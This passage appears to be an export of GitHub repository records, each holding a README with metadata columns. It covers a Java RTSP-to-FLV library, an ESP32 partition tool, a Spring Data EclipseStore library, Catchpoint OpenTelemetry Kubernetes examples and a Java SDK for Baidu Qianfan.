[![Spring Boot](https://img.shields.io/badge/spring--boot-2.7.+-blue.svg)](https://spring.io/projects/spring-boot) 

## 🌟 About Easy-FLV
Easy-FLV is a Java library that converts RTSP or RTMP video streams into FLV format for playback in web browsers. It provides an efficient, stable, and easily integrable solution for real-time video monitoring, live streaming, and video stream processing.

### Why Choose Easy-FLV?
- **Efficient Conversion**: Quickly converts video streams to FLV format with no complex configuration required.
- **Easy Integration**: Used as a Spring Boot Starter, it can be easily integrated into any Java project.
- **Modern Browser Support**: Supports all major modern browsers without the need for additional plugins.
- **Real-time Stream Processing**: Suitable for the conversion of real-time video streams, such as security monitoring and live broadcasting.

## 📄 Screenshots
Below are screenshots of Easy-FLV in action:

![img_1.png](img_1.png)
![img.png](img.png)

## 🚀 Quick Start

### Add Maven Dependency
Include the following Maven dependency in your Spring Boot project:

```xml
<dependency>
    <groupId>io.github.javpower</groupId>
    <artifactId>rtsp-converter-flv-spring-boot-starter</artifactId>
    <version>1.5.9.1</version>
</dependency>
```

### Implement Interface
Create a service class that implements the `IOpenFLVService` interface to provide the stream address:

```java
@Service
public class RtspDataService implements IOpenFLVService {

    @Override
    public String getUrl(Integer channel) {
        // Retrieve the RTSP stream address based on the channel
        return ""rtsp://10.11.9.251:554/openUrl/16HV8mA"";
    }
}
```

### Configure YAML
Configure Easy-FLV in your `application.yml`:

```yaml
easy:
  flv:
    host: http://localhost:8200
```

### Use Interface
To get the converted stream address and play it in a browser:

- Conversion URL: `GET http://ip:port/get/flv/hls/stream_{channel}.flv`
- Direct Browser Playback: `GET http://ip:port/flv/hls/stream_{channel}.flv`

### Direct Usage
If you prefer not to implement an interface, you can directly encode the stream address and convert it:

```java
public static void main(String[] args) throws UnsupportedEncodingException {
    String url = ""rtsp://XXXXXXXX"";
    String encodedUrl = java.net.URLEncoder.encode(url, ""UTF-8"");
    System.out.println(""Encoded Stream URL: "" + encodedUrl);
}
```

- Conversion URL: `GET http://ip:port/get/flv/hls/stream?url=EncodedAddress`
- Direct Browser Playback: `GET http://ip:port/flv/hls/stream?url=EncodedAddress`

## 🛠️ Contribution
Contributions of any kind are welcome, including but not limited to reporting bugs, submitting fixes, adding new features, and improving documentation.

## 📄 License
Easy-FLV is released under the [Apache License 2.0](LICENSE).

## 📧 Contact
- Email: [javpower@163.com](mailto:javpower@163.com)
- GitHub: [https://github.com/javpower/easy-flv](https://github.com/javpower/easy-flv)
- Gitee: [https://gitee.com/giteeClass/easy-flv](https://gitee.com/giteeClass/easy-flv)
",0,3,1,apache-2.0,1.0,"['java', 'flv', 'converter', 'java', 'library', 'convert', 'rtsp', 'rtmp', 'video', 'stream', 'flv', 'format', 'playback', 'web', 'browser', 'provides', 'efficient', 'stable', 'easily', 'integrable', 'solution', 'video', 'monitoring', 'live', 'streaming', 'video', 'stream', 'processing', 'choose', 'efficient', 'conversion', 'quickly', 'convert', 'video', 'stream', 'flv', 'format', 'complex', 'configuration', 'required', 'easy', 'integration', 'used', 'spring', 'boot', 'starter', 'easily', 'integrated', 'java', 'project', 'modern', 'browser', 'support', 'support', 'major', 'modern', 'browser', 'without', 'need', 'additional', 'plugins', 'stream', 'processing', 'suitable', 'conversion', 'video', 'stream', 'security', 'monitoring', 'live', 'broadcasting', 'screenshots', 'screenshots', 'action', 'quick', 'start', 'add', 'maven', 'dependency', 'include', 'following', 'maven', 'dependency', 'spring', 'boot', 'project', 'implement', 'interface', 'create', 'service', 'class', 'implement', 'interface', 'provide', 'stream', 'address', 'configure', 'yaml', 'configure', 'use', 'interface', 'get', 'converted', 'stream', 'address', 'play', 'browser', 'conversion', 'url', 'direct', 'browser', 'playback', 'direct', 'usage', 'prefer', 'implement', 'interface', 'directly', 'encode', 'stream', 'address', 'convert', 'conversion', 'url', 'direct', 'browser', 'playback', 'contribution', 'contribution', 'kind', 'welcome', 'including', 'limited', 'reporting', 'bug', 'submitting', 'fix', 'adding', 'new', 'feature', 'improving', 'documentation', 'license', 'released', 'apache', 'license', 'contact', 'email', 'javpower', 'github', 'http', 'gitee', 'http']","['stream', 'browser', 'video', 'conversion', 'interface']",0,0,0,"['java', 'flv', 'converter', 'about', 'why', 'choose', 'screenshots', 'quick', 'start', 'add', 'maven', 'dependency', 'implement', 'interface', 'configure', 'yaml', 'use', 'interface', 'direct', 'usage', 'contribution', 'license', 'contact']",13,"['interface', 'java', 'flv', 'converter', 'about']",4,0.0,1.0,"[ org.apache.maven.plugins:maven-source-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-deploy-plugin,org.apache.maven.plugins:maven-gpg-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.sonatype.plugins:nexus-staging-maven-plugin,org.springframework.boot:spring-boot-maven-plugin]",0.0,1.0,0.0,3629,30.529411764705884,5.15606936416185,"['![GitHub stars -> https://img.shields.io/github/stars/javpower/easy-flv.svg', '![GitHub issues -> https://img.shields.io/github/issues/javpower/easy-flv.svg', '![Apache License 2.0 -> https://img.shields.io/badge/license-Apache%202.0-blue.svg', '![Java Version -> https://img.shields.io/badge/java-1.8+-orange.svg', '![Spring Boot -> https://img.shields.io/badge/spring--boot-2.7.+-blue.svg', 'https://github.com/javpower/easy-flv -> https://github.com/javpower/easy-flv', 'https://gitee.com/giteeClass/easy-flv -> https://gitee.com/giteeClass/easy-flv']",7
serifpersia/esp32partitiontool,main,"<div align=""center"">

![logo-icon](https://github.com/user-attachments/assets/1463c312-1e81-4107-93be-0570c1b52532)
    
</div>


<div align=""center"">
    <img src=""https://img.shields.io/badge/ESP32-f8a631"" height=""50"">
    <img src=""https://img.shields.io/badge/Partition-bf457a"" height=""50"">
    <img src=""https://img.shields.io/badge/Tool-42b0f5"" height=""50"">
    <a href=""https://github.com/serifpersia/esp32partitiontool/releases/latest""><img src=""https://img.shields.io/badge/v1.4-9a41c2"" height=""50""></a>
</div>

## Overview
The ESP32 Partition Tool is a utility designed to facilitate creating custom partition schemes in Arduino IDE 1.8.x & PlatformIO.

This tool aims to simplify the process of creating custom partition schemes for ESP32 projects.
## Screenshots
![Screenshot 1](https://github.com/serifpersia/esp32partitiontool/assets/62844718/8724d57c-ebb5-404f-97f1-fe09134f53b5)
![image](https://github.com/user-attachments/assets/0a96d12d-0a71-4ba8-8134-8731e5dda2cf)
![platformioimagetool](https://github.com/user-attachments/assets/58244ede-f31e-4f83-8e7f-d17d2b5c0625)



## Functionality

- [x] Create partitions csv
- [x] Import custom partitions csv
- [x] Export custom partitions csv
- [x] Create & upload custom SPIFFS image(SPIFFS, LittleFS or FATFS)
- [x] Create & upload merged binary(Serial ports only)

## Download
 [![Release](https://img.shields.io/github/release/serifpersia/esp32partitiontool.svg?style=flat-square)](https://github.com/serifpersia/esp32partitiontool/releases)

# Build Instructions

## Build Requirements
Ensure you have the following installed:
- **Java JDK 8**: Required for compiling Java source files.
- **Python 3.6+**: Required for running the build script.

## Building the Tool

1. **Clone the Repository**:
   ```sh
   git clone https://github.com/serifpersia/esp32partitiontool.git
   cd esp32partitiontool
   ```
## Run the Build Script

- On **Unix-based systems** (Linux, macOS):
  ```
    python3 build_tool.py
- On **Windows**:
  ```
    python build_tool.py
  ```

## Installation (Arduino IDE)
- Download the tool from releases or build it yourself.
- In your Arduino sketchbook directory, create tools directory if it doesn't exist yet.
- Unpack the tool into tools directory (the path will look like `<home_dir>/Arduino/tools/ESP32PartitionTool/tool/ESP32PartitionTool.jar`).
- Restart Arduino IDE

## Usage (Arduino IDE)
- Select Tools > ESP32 Partition Tool menu item.
- Customize partition scheme.
- Export the custom partitions CSV file to sketch directory.
- Select Tools > Partition Scheme & select `Huge App (3MB APP/NO OTA/1MB SPIFFS)`*this will tell Arduino IDE to use our custom partitions.csv file that's located in sketch directory(export csv via the the tool first).
- Close and open the tool to automatically load csv located at the sketch directory or load csv manually with import csv button.
- Configure Flash size and use the uploading buttons. Upload SPIFFS for filesystem spiffs binary, Upload Merge for uploading all binaries or Merge binary for just creating the merge binary file.
* Merged binary can only be uploaded to ESP32 boards via serial ports, OTA uploading is not supported, spiffs upload is supported for uploading over OTA.

## Installation (Platformio)

- Install Java and make sure the executable is in the path
- Create a `partition_manager.py` in your project folder

#### partition_manager.py

```python
Import('env')
import os.path
import sys

# add esp32partitiontool to path
sys.path.append(os.path.abspath( env.PioPlatform().get_package_dir(""tool-esp32partitiontool"") ))
# import module
from esp32partitiontool import *
# run module
load_pm(env)
```

- To launch the GUI, both `extra_scripts` and `platform_packages` entries must be set

#### platformio.ini

```ini
[platformio]
src_dir = src
default_envs = hello-world

[env]
framework = arduino
platform = espressif32
board = esp32dev
; register the ""tool-esp32partitiontool""
; remove url if you have own built tool in pacakges directory of platformio core directory
platform_packages = tool-esp32partitiontool @ https://github.com/serifpersia/esp32partitiontool/releases/download/v1.4.4/esp32partitiontool-platformio.zip
; register the ""edit_partition"" target
extra_scripts = partition_manager.py

[env:hello-world]
board_build.partitions = partitions/default.csv
board_upload.flash_size = 4MB
upload_speed = 1500000


```

- If building the plugin from source, remove the URL from the `platform_packages` entry ...

```ini
platform_packages      = tool-esp32partitiontool
```

- ... and use `pio pkg` to install the plugin from the root of your platformio project:

```shell
pio pkg install -e build-partition --no-save --tool /path/to/esp32partitiontool/esp32partitiontool-platformio.zip --force
```


## Usage (Platformio)

- If building from vsCode: run  ESP32 Partition Tool Task
- If building from a shell : `pio run -t edit_partition -e your_environment`



## Issues and Contributions
Feel free to report any [issues](https://github.com/serifpersia/esp32partitiontool/issues). Translation [contributions are welcome](https://github.com/serifpersia/esp32partitiontool/tree/main/src/main/resources/l10n) if you find the current translations to be wrong, not adequate or you want to add support for another language.

## License
This project is licensed under the [MIT License](LICENSE).


",6,0,1,mit,8.0,"['overview', 'partition', 'tool', 'utility', 'designed', 'facilitate', 'creating', 'custom', 'partition', 'scheme', 'arduino', 'ide', 'platformio', 'tool', 'aim', 'simplify', 'process', 'creating', 'custom', 'partition', 'scheme', 'project', 'screenshots', 'functionality', 'x', 'create', 'partition', 'csv', 'x', 'import', 'custom', 'partition', 'csv', 'x', 'export', 'custom', 'partition', 'csv', 'x', 'create', 'upload', 'custom', 'spiff', 'image', 'spiff', 'littlefs', 'fatfs', 'x', 'create', 'upload', 'merged', 'binary', 'serial', 'port', 'download', 'build', 'instruction', 'build', 'requirements', 'ensure', 'following', 'installed', 'java', 'jdk', 'required', 'compiling', 'java', 'source', 'file', 'python', 'required', 'running', 'build', 'script', 'building', 'tool', 'clone', 'repository', 'run', 'build', 'script', 'system', 'linux', 'macos', 'window', 'installation', 'arduino', 'ide', 'download', 'tool', 'release', 'build', 'arduino', 'sketchbook', 'directory', 'create', 'tool', 'directory', 'exist', 'yet', 'unpack', 'tool', 'tool', 'directory', 'path', 'look', 'like', 'restart', 'arduino', 'ide', 'usage', 'arduino', 'ide', 'select', 'tool', 'partition', 'tool', 'menu', 'item', 'customize', 'partition', 'scheme', 'export', 'custom', 'partition', 'csv', 'file', 'sketch', 'directory', 'select', 'tool', 'partition', 'scheme', 'select', 'tell', 'arduino', 'ide', 'use', 'custom', 'file', 'located', 'sketch', 'directory', 'export', 'csv', 'via', 'tool', 'first', 'close', 'open', 'tool', 'automatically', 'load', 'csv', 'located', 'sketch', 'directory', 'load', 'csv', 'manually', 'import', 'csv', 'button', 'configure', 'flash', 'size', 'use', 'uploading', 'button', 'upload', 'spiff', 'filesystem', 'spiff', 'binary', 'upload', 'merge', 'uploading', 'binary', 'merge', 'binary', 'creating', 'merge', 'binary', 'file', 'merged', 'binary', 'uploaded', 'board', 'via', 'serial', 'port', 'ota', 'uploading', 'supported', 'spiff', 'upload', 'supported', 'uploading', 'ota', 'installation', 'platformio', 'install', 'java', 'make', 'sure', 'executable', 'path', 'create', 'project', 'folder', 'launch', 'gui', 'entry', 'must', 'set', 'building', 'plugin', 'source', 'remove', 'url', 'entry', 'use', 'install', 'plugin', 'root', 'platformio', 'project', 'usage', 'platformio', 'building', 'vscode', 'run', 'partition', 'tool', 'task', 'building', 'shell', 'issue', 'contribution', 'feel', 'free', 'report', 'issue', 'translation', 'contribution', 'welcome', 'find', 'current', 'translation', 'wrong', 'adequate', 'want', 'add', 'support', 'another', 'language', 'license', 'project', 'licensed', 'mit', 'license']","['tool', 'partition', 'csv', 'custom', 'arduino']",0,0,0,"['overview', 'screenshots', 'functionality', 'download', 'build', 'instruction', 'build', 'requirement', 'building', 'tool', 'run', 'build', 'script', 'installation', 'arduino', 'ide', 'usage', 'arduino', 'ide', 'installation', 'platformio', 'add', 'path', 'import', 'module', 'run', 'module', 'usage', 'platformio', 'issue', 'contribution', 'license']",19,"['build', 'run', 'installation', 'arduino', 'ide']",7,0.0,1.0,"[maven-clean-plugin,org.apache.maven.plugins:maven-jar-plugin]",0.0,1.0,0.0,5361,30.08333333333333,5.666204986149585,"['logo-icon -> https://github.com/user-attachments/assets/1463c312-1e81-4107-93be-0570c1b52532', 'Screenshot 1 -> https://github.com/serifpersia/esp32partitiontool/assets/62844718/8724d57c-ebb5-404f-97f1-fe09134f53b5', 'image -> https://github.com/user-attachments/assets/0a96d12d-0a71-4ba8-8134-8731e5dda2cf', 'platformioimagetool -> https://github.com/user-attachments/assets/58244ede-f31e-4f83-8e7f-d17d2b5c0625', '![Release -> https://img.shields.io/github/release/serifpersia/esp32partitiontool.svg?style=flat-square', 'issues -> https://github.com/serifpersia/esp32partitiontool/issues', 'contributions are welcome -> https://github.com/serifpersia/esp32partitiontool/tree/main/src/main/resources/l10n', 'x', 'x', 'x', 'x', 'x', 'platformio', 'env']",14
xdev-software/spring-data-eclipse-store,develop,"[![Latest version](https://img.shields.io/maven-central/v/software.xdev/spring-data-eclipse-store?logo=apache%20maven)](https://mvnrepository.com/artifact/software.xdev/spring-data-eclipse-store)
[![Build](https://img.shields.io/github/actions/workflow/status/xdev-software/spring-data-eclipse-store/check-build.yml?branch=develop)](https://github.com/xdev-software/spring-data-eclipse-store/actions/workflows/check-build.yml?query=branch%3Adevelop)
[![Quality Gate Status](https://sonarcloud.io/api/project_badges/measure?project=xdev-software_spring-data-eclipse-store&metric=alert_status)](https://sonarcloud.io/dashboard?id=xdev-software_spring-data-eclipse-store)
[![Documentation](https://img.shields.io/maven-central/v/software.xdev/spring-data-eclipse-store?label=docs)](https://spring-eclipsestore.xdev.software/)

<div align=""center"">
    <img src=""assets/Logo.png"" height=""200"" alt=""XDEV Spring-Data Eclipse-Store Logo"">
</div>

# spring-data-eclipse-store

A library to simplify using [EclipseStore](https://eclipsestore.io/) in the [Spring environment](https://spring.io/projects/spring-data/).

What makes this library special is, that it creates a working copy of the data.
This way EclipseStore behaves almost exactly like relational database from a coding perspective.

## Features

The library provides following features:

* Enforces the
  **[Spring data repository concept](https://docs.spring.io/spring-data/jpa/reference/repositories/core-concepts.html)**
  for EclipseStore by
  using [working copies](https://xdev-software.github.io/spring-data-eclipse-store/working-copies.html)
* **[Drop in compatible](https://xdev-software.github.io/spring-data-eclipse-store/installation.html#drop-in-compatible)** for your existing Spring application
* Utilizes **ultra-fast EclipseStore serializing and storing**
* Enables your application to **select
  any [EclipseStore target](https://docs.eclipsestore.io/manual/storage/storage-targets/index.html)** (e.g.
  [PostgreSQL](https://docs.eclipsestore.io/manual/storage/storage-targets/sql-databases/postgresql.html),
  [AWS S3](https://docs.eclipsestore.io/manual/storage/storage-targets/blob-stores/aws-s3.html) or
  [IBM COS](https://github.com/xdev-software/eclipse-store-afs-ibm-cos))
* Can save up to **99%[^1] of monthly costs** in the IBM Cloud and up to 82%[^2] in the AWS Cloud

[^1]:If the COS Connector is used in the IBM Cloud instead of a PostgreSQL and approx. 10,000 entries with a total size
of 1
GB of data are stored. ([IBM Cloud Pricing](https://cloud.ibm.com/estimator/estimates), as of 08.01.2024)

[^2]: If the S3 connector is used instead of DynamoDB under the same conditions at
AWS. ([AWS Pricing Calculator](https://calculator.aws/#/estimate?id=ab85cddf77f0d1aa0457111ed82785dfb836b1d8), as of
08.01.2024)

## Installation & Usage

[**Installation
guide** for the latest release](https://github.com/xdev-software/spring-data-eclipse-store/releases/latest#Installation)

[**Detailed
instructions** are in the documentation](https://xdev-software.github.io/spring-data-eclipse-store/installation.html)

### Supported versions

| Spring-Data-Eclipse-Store | Java   | Spring Data | EclipseStore |
|---------------------------|--------|-------------|--------------|
| ``<= 1.0.2``              | ``17`` | ``3.2.2``   | ``1.1.0``    |
| ``1.0.3/1.0.4``           | ``17`` | ``3.2.3``   | ``1.2.0``    |
| ``1.0.5-1.0.7``           | ``17`` | ``3.2.5``   | ``1.3.2``    |
| ``1.0.8-1.0.10``          | ``17`` | ``3.3.1``   | ``1.3.2``    |
| ``2.0.0-2.1.0``           | ``17`` | ``3.3.2``   | ``1.4.0``    |
| ``>= 2.2.0``              | ``17`` | ``3.3.4``   | ``1.4.0``    |

## Demo

To see how easy it is to implement EclipseStore in your Spring project, take a look at
the [demos](./spring-data-eclipse-store-demo):

* [Simple demo](https://github.com/xdev-software/spring-data-eclipse-store/tree/develop/spring-data-eclipse-store-demo/src/main/java/software/xdev/spring/data/eclipse/store/demo/simple)
* [Complex demo](https://github.com/xdev-software/spring-data-eclipse-store/tree/develop/spring-data-eclipse-store-demo/src/main/java/software/xdev/spring/data/eclipse/store/demo/complex)
* [Demo with coexisting JPA](https://github.com/xdev-software/spring-data-eclipse-store/tree/develop/spring-data-eclipse-store-jpa/src/main/java/software/xdev/spring/data/eclipse/store/jpa)
* [Dual storage demo](https://github.com/xdev-software/spring-data-eclipse-store/tree/develop/spring-data-eclipse-store-demo/src/main/java/software/xdev/spring/data/eclipse/store/demo/dual/storage)

> [!NOTE]  
> Since the library is using reflection to copy data, the following JVM-Arguments may have to be set:
> ```
> --add-opens=java.base/java.util=ALL-UNNAMED
> --add-exports java.base/jdk.internal.misc=ALL-UNNAMED
> --add-opens=java.base/java.lang=ALL-UNNAMED
> --add-opens=java.base/java.time=ALL-UNNAMED 
> ```

## Support

If you need support as soon as possible, and you can't wait for any pull request, feel free to
use [our support](https://xdev.software/en/services/support).

## Contributing
See the [contributing guide](./CONTRIBUTING.md) for detailed instructions on how to get started with our project.

## Dependencies and Licenses

View the [license of the current project](LICENSE).
",18,2,11,apache-2.0,145.0,"['library', 'simplify', 'using', 'eclipsestore', 'spring', 'environment', 'make', 'library', 'special', 'creates', 'working', 'copy', 'data', 'way', 'eclipsestore', 'behaves', 'almost', 'exactly', 'like', 'relational', 'database', 'coding', 'perspective', 'feature', 'library', 'provides', 'following', 'feature', 'enforces', 'spring', 'data', 'repository', 'concept', 'eclipsestore', 'using', 'working', 'copy', 'drop', 'compatible', 'existing', 'spring', 'application', 'utilizes', 'eclipsestore', 'serializing', 'storing', 'enables', 'application', 'select', 'eclipsestore', 'target', 'postgresql', 'aws', 'ibm', 'co', 'save', 'monthly', 'cost', 'ibm', 'cloud', 'aws', 'cloud', 'co', 'connector', 'used', 'ibm', 'cloud', 'instead', 'postgresql', 'approx', 'entry', 'total', 'size', 'gb', 'data', 'stored', 'ibm', 'cloud', 'pricing', 'connector', 'used', 'instead', 'dynamodb', 'condition', 'aws', 'aws', 'pricing', 'calculator', 'installation', 'usage', 'installation', 'guide', 'latest', 'release', 'detailed', 'instruction', 'documentation', 'supported', 'version', 'java', 'spring', 'data', 'eclipsestore', 'demo', 'see', 'easy', 'implement', 'eclipsestore', 'spring', 'project', 'take', 'look', 'demo', 'simple', 'demo', 'complex', 'demo', 'demo', 'coexisting', 'jpa', 'dual', 'storage', 'demo', 'note', 'since', 'library', 'using', 'reflection', 'copy', 'data', 'following', 'may', 'set', 'support', 'need', 'support', 'soon', 'possible', 'ca', 'wait', 'pull', 'request', 'feel', 'free', 'use', 'support', 'contributing', 'see', 'contributing', 'guide', 'detailed', 'instruction', 'get', 'started', 'project', 'dependency', 'license', 'view', 'license', 'current', 'project']","['eclipsestore', 'demo', 'spring', 'data', 'library']",0,0,0,"['feature', 'installation', 'usage', 'support', 'version', 'demo', 'support', 'contribute', 'dependency', 'license']",8,"['support', 'feature', 'installation', 'usage', 'version']",1,263.0,5.0,"[com.mycila:license-maven-plugin,org.apache.maven.plugins:maven-checkstyle-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-gpg-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-jxr-plugin,org.apache.maven.plugins:maven-pmd-plugin,org.apache.maven.plugins:maven-project-info-reports-plugin,org.apache.maven.plugins:maven-site-plugin,org.apache.maven.plugins:maven-source-plugin,org.apache.maven.plugins:maven-surefire-plugin,org.codehaus.mojo:flatten-maven-plugin,org.sonatype.plugins:nexus-staging-maven-plugin,org.springframework.boot:spring-boot-maven-plugin]",0.0,4.0,1.0,5272,56.07142857142857,4.830573248407643,"['![Latest version -> https://img.shields.io/maven-central/v/software.xdev/spring-data-eclipse-store?logo=apache%20maven', '![Build -> https://img.shields.io/github/actions/workflow/status/xdev-software/spring-data-eclipse-store/check-build.yml?branch=develop', '![Quality Gate Status -> https://sonarcloud.io/api/project_badges/measure?project=xdev-software_spring-data-eclipse-store&metric=alert_status', '![Documentation -> https://img.shields.io/maven-central/v/software.xdev/spring-data-eclipse-store?label=docs', 'EclipseStore -> https://eclipsestore.io/', 'Spring environment -> https://spring.io/projects/spring-data/', 'Spring data repository concept -> https://docs.spring.io/spring-data/jpa/reference/repositories/core-concepts.html', 'working copies -> https://xdev-software.github.io/spring-data-eclipse-store/working-copies.html', 'Drop in compatible -> https://xdev-software.github.io/spring-data-eclipse-store/installation.html#drop-in-compatible', 'EclipseStore target -> https://docs.eclipsestore.io/manual/storage/storage-targets/index.html', 'PostgreSQL -> https://docs.eclipsestore.io/manual/storage/storage-targets/sql-databases/postgresql.html', 'AWS S3 -> https://docs.eclipsestore.io/manual/storage/storage-targets/blob-stores/aws-s3.html', 'IBM COS -> https://github.com/xdev-software/eclipse-store-afs-ibm-cos', 'IBM Cloud Pricing -> https://cloud.ibm.com/estimator/estimates', 'AWS Pricing Calculator -> https://calculator.aws/#/estimate?id=ab85cddf77f0d1aa0457111ed82785dfb836b1d8', 'Simple demo -> https://github.com/xdev-software/spring-data-eclipse-store/tree/develop/spring-data-eclipse-store-demo/src/main/java/software/xdev/spring/data/eclipse/store/demo/simple', 'Complex demo -> https://github.com/xdev-software/spring-data-eclipse-store/tree/develop/spring-data-eclipse-store-demo/src/main/java/software/xdev/spring/data/eclipse/store/demo/complex', 'Demo with coexisting JPA -> https://github.com/xdev-software/spring-data-eclipse-store/tree/develop/spring-data-eclipse-store-jpa/src/main/java/software/xdev/spring/data/eclipse/store/jpa', 'Dual storage demo -> https://github.com/xdev-software/spring-data-eclipse-store/tree/develop/spring-data-eclipse-store-demo/src/main/java/software/xdev/spring/data/eclipse/store/demo/dual/storage', 'our support -> https://xdev.software/en/services/support']",20
catchpoint/Tracing.examples-kubernetes-java,main,"# Catchpoint Tracing Examples - Kubernetes/Java

## Pre-Requirements
1. **JDK** (`1.8+`)
2. **Maven** (`3.x`)
3. Please make sure **Docker Desktop** is installed and **Kubernetes** is activated. 
   Read [this](https://birthday.play-with-docker.com/kubernetes-docker-desktop) for details.
4. Please make sure **Kubernetes CLI** (`kubernetes-cli`/`kubectl`) is installed. 
   See [here](https://kubernetes.io/docs/tasks/tools/) for details.
   
## Setup with OpenTelemetry From the Beginning
This setup shows how you can install OpenTelemetry resources into Kubernetes first and deploy application later then.
So deployed applications will be auto instrumented.

### Setup OpenTelemetry Resources in Kubernetes
1. Replace `<CATCHPOINT-TRACING-API-KEY>` with your Catchpoint Tracing API key in `otel/collector.yaml` file.
2. Then run the setup script which installs **OpenTelemetry Operator** and **OpenTelemetry Instrumentation CR** (Custom Resource) into Kubernetes:
   ```bash
   ./otel/setup-otel.sh
   ```

### Deploy the Applications into Kubernetes with OTEL
1. Run the deployment script which deploys database and applications **with** OpenTelemetry configuration into Kubernetes:
	```bash
	./apps/deploy-apps-with-otel-conf.sh
	```
2. Wait until all services are activated.
3. Go to http://localhost:30000.

## Install OpenTelemetry After Setup

### Deploy the Applications into Kubernetes without OTEL
1. Run the deployment script which deploys database and applications **without** OpenTelemetry configuration into Kubernetes:
   ```bash
   ./apps/deploy-apps.sh
   ```
2. Wait until all services are activated.
3. Go to http://localhost:30000.

### Setup OpenTelemetry Resources in Kubernetes
1. Replace `<CATCHPOINT-TRACING-API-KEY>` with your Catchpoint Tracing API key in `otel/collector.yaml` file.
2. Then run the setup script which installs **OpenTelemetry Operator** and **OpenTelemetry Instrumentation CR** (Custom Resource) into Kubernetes:
   ```bash
   ./otel/setup-otel.sh
   ```
   
### Patch Services to be Traced by OpenTelemetry
1. Run the patch script which updates application deployments by adding **OpenTelemetry Auto Instrumentation Annotation** (`instrumentation.opentelemetry.io/inject-java`) to the services to be traced:
   ```bash
   ./apps/patch-apps-with-otel-conf.sh
   ```
2. Wait until all services are restarted.
3. Go to http://localhost:30000.

## Destroy

### Destroy the Deployment of Applications
1. Run the application destroy script which deletes applications and database deployed to Kubernetes:
   ```bash
   ./apps/destroy-apps.sh
   ```
2. Wait until all resources are deleted.

### Destroy the Resources of OpenTelemetry
1. Run the OpenTelemetry destroy script for deleting the OpenTelemetry resources (operator and instrumentation CR), 
   ```bash
   ./otel/destroy-otel.sh
   ```
2. Wait until all resources are deleted.
",0,0,2,apache-2.0,2.0,"['catchpoint', 'tracing', 'example', 'jdk', 'maven', 'please', 'make', 'sure', 'docker', 'desktop', 'installed', 'kubernetes', 'activated', 'read', 'detail', 'please', 'make', 'sure', 'kubernetes', 'cli', 'installed', 'see', 'detail', 'setup', 'opentelemetry', 'beginning', 'setup', 'show', 'install', 'opentelemetry', 'resource', 'kubernetes', 'first', 'deploy', 'application', 'later', 'deployed', 'application', 'auto', 'instrumented', 'setup', 'opentelemetry', 'resources', 'kubernetes', 'replace', 'catchpoint', 'tracing', 'api', 'key', 'file', 'run', 'setup', 'script', 'installs', 'opentelemetry', 'operator', 'opentelemetry', 'instrumentation', 'cr', 'custom', 'resource', 'kubernetes', 'deploy', 'application', 'kubernetes', 'otel', 'run', 'deployment', 'script', 'deploys', 'database', 'application', 'opentelemetry', 'configuration', 'kubernetes', 'wait', 'service', 'activated', 'go', 'http', 'install', 'opentelemetry', 'setup', 'deploy', 'application', 'kubernetes', 'without', 'otel', 'run', 'deployment', 'script', 'deploys', 'database', 'application', 'without', 'opentelemetry', 'configuration', 'kubernetes', 'wait', 'service', 'activated', 'go', 'http', 'setup', 'opentelemetry', 'resources', 'kubernetes', 'replace', 'catchpoint', 'tracing', 'api', 'key', 'file', 'run', 'setup', 'script', 'installs', 'opentelemetry', 'operator', 'opentelemetry', 'instrumentation', 'cr', 'custom', 'resource', 'kubernetes', 'patch', 'service', 'traced', 'opentelemetry', 'run', 'patch', 'script', 'update', 'application', 'deployment', 'adding', 'opentelemetry', 'auto', 'instrumentation', 'annotation', 'service', 'traced', 'wait', 'service', 'restarted', 'go', 'http', 'destroy', 'destroy', 'deployment', 'application', 'run', 'application', 'destroy', 'script', 'deletes', 'application', 'database', 'deployed', 'kubernetes', 'wait', 'resource', 'deleted', 'destroy', 'resources', 'opentelemetry', 'run', 'opentelemetry', 'destroy', 'script', 'deleting', 'opentelemetry', 'resource', 'operator', 'instrumentation', 'cr', 'wait', 'resource', 'deleted']","['opentelemetry', 'kubernetes', 'application', 'setup', 'run']",1,0,0,"['catchpoint', 'tracing', 'example', 'setup', 'opentelemetry', 'from', 'begin', 'setup', 'opentelemetry', 'resource', 'kubernetes', 'deploy', 'application', 'kubernetes', 'otel', 'install', 'opentelemetry', 'after', 'setup', 'deploy', 'application', 'kubernetes', 'without', 'otel', 'setup', 'opentelemetry', 'resource', 'kubernetes', 'patch', 'service', 'traced', 'opentelemetry', 'destroy', 'destroy', 'deployment', 'application', 'destroy', 'resource', 'opentelemetry']",12,"['opentelemetry', 'setup', 'kubernetes', 'resource', 'application']",7,23.0,1.0,"[org.apache.maven.plugins:maven-assembly-plugin,org.apache.maven.plugins:maven-checkstyle-plugin,org.apache.maven.plugins:maven-surefire-plugin,org.springframework.boot:spring-boot-maven-plugin,org.xolstice.maven.plugins:protobuf-maven-plugin]",0.0,1.0,0.0,2877,10.432432432432432,5.582901554404145,"['this -> https://birthday.play-with-docker.com/kubernetes-docker-desktop', 'here -> https://kubernetes.io/docs/tasks/tools/']",2
oldmanpushcart/qianfan4j,main,"# qianfan4j：千帆 Java SDK
![License](https://img.shields.io/badge/License-Apache_2.0-green.svg)
![JDK17+](https://img.shields.io/badge/JDK-17+-blue.svg)
![LLM-文心一言](https://img.shields.io/badge/LLM-%E6%96%87%E5%BF%83%E4%B8%80%E8%A8%80-blue.svg)

`qianfan4j`是一个开源的千帆大模型平台的非官方Java客户端，基于`JDK17`构建。它旨在提供一个功能丰富、易于集成和使用的Java库，以便开发者能够通过千帆API轻松实现对话、续写、向量嵌入和图像处理等功能。

> 请注意：在使用`qianfan4j`时，你需要遵守千帆API的使用条款和条件。

## 一、主要功能

`qianfan4j`支持以下千帆API功能：

- **对话（Chat）**
    - 提供用户与千帆模型进行自然语言对话。
    - 支持用户在一次对话中触发多个函数调用。

- **续写（Completions）**
    - 提供文本续写功能，可以根据给定的文本片段生成后续内容。

- **向量（Embeddings）**
    - 将文本转换为向量表示，用于文本相似度比较、聚类等任务。

- **图像（Images）**
    - **图生文：** 根据提供的图像生成描述性文本。
    - **文生图：** 将文本描述转换为相应的图像。

- **插件应用（Plugin）**
    - **知识库：** 让开发者（甚至非技术人员）以简单的方式管理数据集，包括分片、清洗、向量计算等能力。
    - **智慧图问：** 图片理解识别，并对图片内容进行总结概述，输出用户可理解的句子或段落。
    - **百度搜索：** 百度搜索插件,实时获取新闻、股票信息等
